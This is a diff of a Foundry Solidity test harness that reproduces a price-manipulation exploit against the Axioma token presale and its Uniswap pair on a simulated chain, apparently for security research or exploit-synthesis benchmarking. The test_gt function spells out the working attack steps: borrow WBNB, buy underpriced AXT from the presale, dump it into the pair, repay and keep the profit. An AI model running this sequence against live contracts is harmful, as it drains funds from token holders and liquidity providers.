@@ -1,14 +1,15 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "./AttackContract.sol";
-import "./Axioma.sol";
-import "./AxiomaPresale.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
+import {AttackContract} from "./AttackContract.sol";
+import {AxiomaPresale} from "./AxiomaPresale.sol";
+import {Axioma} from "./Axioma.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
 import {WBNB} from "@utils/WBNB.sol";
+
 contract AxiomaTestBase is Test, BlockLoader {
     WBNB wbnb;
     Axioma axt;
@@ -42,6 +43,7 @@ contract AxiomaTestBase is Test, BlockLoader {
     uint256 balanceOfaxtpair = 14157668659303833605910;
     uint256 balanceOfaxtaxiomaPresale = 9999996160000000000000000;
     uint256 balanceOfaxtattacker = 0;
+
     function setUp() public {
         owner = address(this);
         wbnb = new WBNB();
@@ -85,9 +87,11 @@ contract AxiomaTestBase is Test, BlockLoader {
         axt.enableTrading();
         axt.afterDeploy(address(router), address(pair));
     }
+
     modifier eurus() {
         _;
     }
+
     function printBalance(string memory tips) public {
         emit log_string(tips);
         emit log_string("Wbnb Balances: ");
@@ -137,63 +141,77 @@ contract AxiomaTestBase is Test, BlockLoader {
         emit log_string("");
         emit log_string("");
     }
+
     function attackGoal() public view returns (bool) {
         return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
     }
+
     function borrow_wbnb_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
         wbnb.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_wbnb_owner(uint256 amount) internal eurus {
         wbnb.transfer(owner, amount);
     }
+
     function borrow_axt_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
         axt.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_axt_owner(uint256 amount) internal eurus {
         axt.transfer(owner, amount);
     }
+
     function borrow_wbnb_pair(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(pair));
         wbnb.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_wbnb_pair(uint256 amount) internal eurus {
         wbnb.transfer(address(pair), amount);
     }
+
     function borrow_axt_pair(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(pair));
         axt.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_axt_pair(uint256 amount) internal eurus {
         axt.transfer(address(pair), amount);
     }
+
     function borrow_wbnb_axiomaPresale(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(axiomaPresale));
         wbnb.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_wbnb_axiomaPresale(uint256 amount) internal eurus {
         wbnb.transfer(address(axiomaPresale), amount);
     }
+
     function borrow_axt_axiomaPresale(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(axiomaPresale));
         axt.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_axt_axiomaPresale(uint256 amount) internal eurus {
         axt.transfer(address(axiomaPresale), amount);
     }
+
     function swap_pair_attacker_axt_wbnb(
         uint256 amount,
         uint256 amountOut
@@ -201,6 +219,7 @@ contract AxiomaTestBase is Test, BlockLoader {
         axt.transfer(address(pair), amount);
         pair.swap(0, amountOut, attacker, new bytes(0));
     }
+
     function swap_pair_attacker_wbnb_axt(
         uint256 amount,
         uint256 amountOut
@@ -208,26 +227,35 @@ contract AxiomaTestBase is Test, BlockLoader {
         wbnb.transfer(address(pair), amount);
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
+
     function swap_axiomaPresale_attacker_wbnb_axt(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        WETH(address(wbnb)).approve(address(axiomaPresale), amount);
+        wbnb.approve(address(axiomaPresale), amount);
         axiomaPresale.buyToken(amount, address(wbnb));
     }
+
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 32500 * 1e15);
         borrow_wbnb_owner(32500 * 1e15);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 32500 * 1e15);
+        emit log_named_uint("amt2", 1);
         swap_axiomaPresale_attacker_wbnb_axt(32500 * 1e15, 1);
         printBalance("After step1 ");
+        emit log_named_uint("amt3", axt.balanceOf(attacker));
+        emit log_named_uint("amt4", 33500 * 1e15);
         swap_pair_attacker_axt_wbnb(axt.balanceOf(attacker), 33500 * 1e15);
         printBalance("After step2 ");
+        emit log_named_uint("amt5", 32500 * 1e15);
         payback_wbnb_owner(32500 * 1e15);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
+
     function check_gt(
         uint256 amt0,
         uint256 amt1,
@@ -242,7 +270,7 @@ contract AxiomaTestBase is Test, BlockLoader {
         swap_axiomaPresale_attacker_wbnb_axt(amt1, amt2);
         swap_pair_attacker_axt_wbnb(amt3, amt4);
         payback_wbnb_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
